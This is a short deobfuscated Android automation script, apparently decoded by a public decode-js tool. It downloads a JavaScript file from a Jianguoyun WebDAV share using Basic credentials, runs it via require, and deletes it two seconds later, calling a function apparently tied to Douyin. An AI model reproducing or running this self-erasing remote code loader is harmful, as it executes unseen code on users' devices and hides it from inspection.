//Thu Feb 27 2025 02:20:47 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
let tp = http.get("http://dav.jianguoyun.com/dav/" + t + k, {
  "headers": {
    "Authorization": "Basic " + java.lang.String(android.util.Base64.encode(java.lang.String(x).getBytes(), 2)),
    "Content-Type": "text/plain;charset=UTF-8",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "ddyu-Agent": "okhttp/3.12.1"
  }
});
if (tp.statusCode == 200) {
  files.createWithDirs("./w/dk1.js");
  files.writeBytes("./w/dk1.js", tp.body.bytes());
  threads.start(function () {
    sleep(2000);
    files.remove("./w/dk1.js");
  });
  require("./w/dk1.js")["某音"](t1, t2);
}
_0xodP = "jsjiami.com.v6";